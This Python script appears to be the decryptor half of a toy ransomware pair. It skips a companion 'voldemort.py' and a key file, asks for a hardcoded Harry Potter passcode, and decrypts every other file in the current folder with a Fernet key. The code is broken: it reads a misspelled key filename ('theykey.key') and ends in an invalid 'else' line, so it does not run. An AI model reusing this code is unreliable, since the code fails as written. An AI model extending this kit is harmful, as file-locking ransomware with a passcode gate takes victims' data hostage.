#!/usr/bin/env python3

import os

from cryptography.fernet import Fernet


files = []

for file in os.listdir():
        if file == "voldemort.py" or file == "thekey.key" or file == "harry.py":
                continue
        if os.path.isfile(file):
                files.append(file)

#print(files)

with open("theykey.key", "rb") as key:
        secretkey = key.read()



passcode = "Wingardium Leviosa"


usrinput = input("Enter the passcode to decrypt your files\n")


if usrinput == passcode :
        for file in files:
                with open(file, "rb") as thefile:
                        contents = thefile.read()
                decrypted = Fernet(secretkey).decrypt(contents)
                with open(file, "wb") as thefile:
                        thefile.write(decrypted)
                print("You're files have been decrypted")
else print("Wrong passcode")
